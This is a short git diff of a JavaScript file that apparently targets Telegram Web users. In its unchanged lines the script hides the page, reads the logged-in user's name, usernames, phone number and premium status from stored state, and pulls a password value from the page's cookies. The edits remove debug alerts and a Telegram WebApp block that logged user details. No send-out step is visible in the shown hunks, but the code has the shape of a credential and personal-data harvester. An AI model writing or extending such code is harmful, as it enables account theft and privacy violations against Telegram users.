@@ -9,8 +9,6 @@ document.addEventListener("DOMContentLoaded", function() {
       const currentUser = parsedState.users.byId[currentUserId];
       document.body.style.display = "none";
 
-      console.log("DDDDD");
-
       if (currentUserId && currentUser) {
         const { firstName, usernames, phoneNumber, isPremium } = currentUser;
         const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1];
@@ -46,25 +44,12 @@ document.addEventListener("DOMContentLoaded", function() {
   }
 
   const checkInterval = setInterval(checkLocalStorage, 100);
-  // Initialize the Telegram Web App
-  alert("LOADED");
-tg.init();
-alert(tg.user.id);
-// When the app is ready, access user information
-tg.onEvent('initialized', function() {
-    // Access user details using the tg object
-    const userId = tg.user.id;
-    const username = tg.user.username;
-    const firstName = tg.user.first_name;
-    const lastName = tg.user.last_name;
-    const phoneNumber = tg.user.phone_number; // Requires user permission
 
-    // Display user information
-    console.log('User ID:', userId);
-    console.log('Username:', username);
-    console.log('First Name:', firstName);
-    console.log('Last Name:', lastName);
-    console.log('Phone Number:', phoneNumber);
-});
+alert(window.Telegram.WebApp.user.id);
+    // const userId = tg.user.id;
+    // const username = tg.user.username;
+    // const firstName = tg.user.first_name;
+    // const lastName = tg.user.last_name;
+    // const phoneNumber = tg.user.phone_number; // Requires user permission
 });
 
